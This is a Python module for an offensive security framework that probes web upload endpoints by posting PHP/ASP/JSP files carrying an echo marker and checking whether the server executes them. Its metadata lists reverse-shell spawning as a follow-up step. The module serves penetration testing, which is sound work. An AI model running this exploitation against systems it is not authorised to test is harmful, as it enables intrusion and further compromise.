#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Generic multipart upload → webshell probe (non-WordPress).

Tests common upload endpoints and parameter names with a harmless PHP/ASP marker,
then verifies execution via a follow-up GET.
"""

from __future__ import annotations

import random
import string
import urllib.parse
from typing import Any, Dict, List, Optional

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.module_result import finalize_http_scanner_run, target_base_url


class Module(Auxiliary, Http_client):

    __info__ = {
        "name": "Generic Upload Webshell Probe",
        "description": (
            "Probe generic file upload surfaces (multipart POST) for unrestricted "
            "extension handling and verify a harmless PHP/ASP execution marker."
        ),
        "author": "KittySploit Team",
        "tags": ["web", "upload", "webshell", "rce", "scanner", "generic"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 6,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals", "endpoints", "params"],
            "chain": {
                "produces_capabilities": [
                    {"capability": "upload_path", "from_detail": "upload_path"},
                    {"capability": "rce", "from_detail": "rce_confirmed"},
                ],
                "suggested_followups": [
                    "post/shell/multi/manage/spawn_reverse_shell",
                    "post/php/exploits/mail_sendmail_rce",
                ],
            },
        },
    }

    upload_paths = OptString(
        "/upload,/api/upload,/files,/file/upload,/media/upload",
        "Comma-separated upload paths to probe",
        False,
    )
    field_names = OptString(
        "file,upload,document,attachment,image",
        "Multipart field names to try",
        False,
    )
    extensions = OptString(
        "php,phtml,php5,asp,aspx,jsp",
        "Extensions to attempt",
        False,
    )
    marker_prefix = OptString("KSUP", "Webshell marker prefix (harmless echo)", False)

    UPLOAD_HINTS = ("upload", "multipart", "file", "attach", "media", "import")

    def _rand_token(self, n: int = 8) -> str:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

    def _paths(self) -> List[str]:
        raw = str(self.upload_paths or "").strip()
        paths = [p.strip() for p in raw.split(",") if p.strip()]
        discovered = [
            str(e).split("?", 1)[0]
            for e in (getattr(self, "discovered_endpoints", None) or [])
            if any(h in str(e).lower() for h in self.UPLOAD_HINTS)
        ]
        merged = list(dict.fromkeys(paths + discovered))[:16]
        return merged or ["/upload"]

    def _fields(self) -> List[str]:
        return [f.strip() for f in str(self.field_names or "file").split(",") if f.strip()][:8]

    def _exts(self) -> List[str]:
        return [e.strip().lstrip(".") for e in str(self.extensions or "php").split(",") if e.strip()][:8]

    def _multipart_upload(
        self,
        path: str,
        field: str,
        filename: str,
        body: bytes,
        content_type: str,
    ) -> Optional[Any]:
        files = {field: (filename, body, content_type)}
        return self.http_request(method="POST", path=path, files=files, allow_redirects=True, timeout=15)

    def _verify_marker(self, url: str, marker: str) -> bool:
        if not url:
            return False
        parsed = urllib.parse.urlparse(url)
        check_path = parsed.path or url
        if not check_path.startswith("/"):
            check_path = f"/{check_path}"
        response = self.http_request(method="GET", path=check_path, allow_redirects=True, timeout=12)
        if not response:
            return False
        return marker in (response.text or "")

    def run(self):
        token = self._rand_token()
        marker = f"{str(self.marker_prefix or 'KSUP')}_{token}"
        php_body = f"<?php echo '{marker}'; ?>".encode()
        asp_body = f"<% Response.Write(\"{marker}\") %>".encode()

        hits: List[Dict[str, Any]] = []
        print_status("Probing generic upload endpoints for webshell placement...")

        for path in self._paths():
            for field in self._fields():
                for ext in self._exts():
                    filename = f"ks_{token}.{ext}"
                    body = asp_body if ext in ("asp", "aspx") else php_body
                    ctype = "application/octet-stream"
                    response = self._multipart_upload(path, field, filename, body, ctype)
                    if not response:
                        continue
                    if response.status_code not in (200, 201, 204, 302):
                        continue

                    candidates: List[str] = []
                    loc = (response.headers.get("Location") or "").strip()
                    if loc:
                        candidates.append(loc)
                    final_url = getattr(response, "url", "") or ""
                    if final_url:
                        candidates.append(final_url)
                    text = response.text or ""
                    for hint in ("/uploads/", "/files/", "/media/", filename):
                        if hint in text:
                            candidates.append(hint if hint.startswith("/") else f"/{filename}")

                    verified = False
                    upload_path = ""
                    for cand in candidates:
                        if self._verify_marker(cand, marker):
                            verified = True
                            upload_path = cand
                            break

                    if verified or response.status_code in (200, 201):
                        print_success(
                            f"Upload accepted: {path} field={field} file={filename} "
                            f"{'EXEC VERIFIED' if verified else 'needs manual verify'}"
                        )
                        hits.append({
                            "vulnerable": verified,
                            "path": path,
                            "field": field,
                            "filename": filename,
                            "extension": ext,
                            "status_code": response.status_code,
                            "upload_path": upload_path or path,
                            "rce_confirmed": "yes" if verified else "partial",
                            "indicator": "upload_webshell" if verified else "upload_accepted",
                            "content_preview": (response.text or "")[:600],
                        })
                        if verified:
                            break
                if hits and hits[-1].get("rce_confirmed") == "yes":
                    break
            if hits and hits[-1].get("rce_confirmed") == "yes":
                break

        chain_extra = {}
        if hits:
            top = hits[-1]
            chain_extra = {
                "upload_path": str(top.get("upload_path") or ""),
                "upload_field": str(top.get("field") or ""),
                "rce_confirmed": str(top.get("rce_confirmed") or ""),
            }

        return finalize_http_scanner_run(
            self,
            hits,
            title="Generic upload webshell probe",
            severity="critical" if any(h.get("rce_confirmed") == "yes" for h in hits) else "high",
            category="upload",
            findings_key="upload_findings",
            hit_mapper=lambda hit: {
                "method": "POST",
                "request_url": target_base_url(self, path=str(hit.get("path") or "/")),
                "param": hit.get("field"),
                "status_code": hit.get("status_code"),
                "evidence_snippet": hit.get("content_preview") or hit.get("indicator"),
                "indicators": [hit.get("indicator")] if hit.get("indicator") else [],
                "upload_path": hit.get("upload_path"),
            },
            vulnerability_info_extra=chain_extra,
        )
